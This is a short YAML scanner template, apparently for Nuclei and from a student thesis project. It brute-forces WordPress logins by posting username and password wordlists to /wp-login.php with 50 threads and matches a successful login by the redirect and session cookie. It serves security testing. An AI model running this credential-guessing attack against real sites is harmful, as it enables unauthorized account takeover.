info:
  id: wordpress-weak-credentials
  name: WordPress Weak Credentials
  author: evolutionsec
  severity: critical
  tags: wordpress,default-login,fuzz

requests:
  - request:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}

        log={{users}}&pwd={{passwords}}

    payloads:
      users: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
      passwords: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
#      users: helpers/wordlists/wp-users.txt
#      passwords: helpers/wordlists/wp-passwords.txt
    threads: 50
    attack: clusterbomb
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302

      - type: word
        words:
          - '/wp-admin'
          - 'wordpress_logged_in'
        condition: and
        part: header